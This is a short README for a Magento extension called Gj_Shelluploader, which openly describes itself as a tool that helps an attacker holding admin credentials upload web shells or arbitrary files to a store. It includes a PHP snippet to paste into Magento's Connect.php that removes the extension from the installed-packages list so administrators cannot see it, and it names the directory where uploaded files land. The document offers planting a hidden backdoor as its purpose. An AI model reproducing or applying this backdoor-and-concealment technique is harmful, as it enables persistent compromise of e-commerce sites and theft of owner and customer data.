# Gj_Shelluploader-1.0.0
Extension helps hacker to upload shell/files in Magento

Dependency: Admin Panel Credentials(To install extension.).

As this extension is made for destructive usage
Extension wont be found on admin > system > configuration > advanced > disable modules output(installed modules list even if its installed.).
Even if on Magento connect manager or downloader you can find our extension if you wanna hide it from there,
you can edit magento-root/downloader/Maged/Model/Connect.php there find function getAllInstalledPackages()
just paste below code at the last & before return statement

if(array_key_exists('Gj_Shelluploader',$packages['community']))
{ unset($packages['community']['Gj_Shelluploader']); }

Uploaded files will be stored "gjthedj" directory(yoursiteurl/gjthedj/filename.).
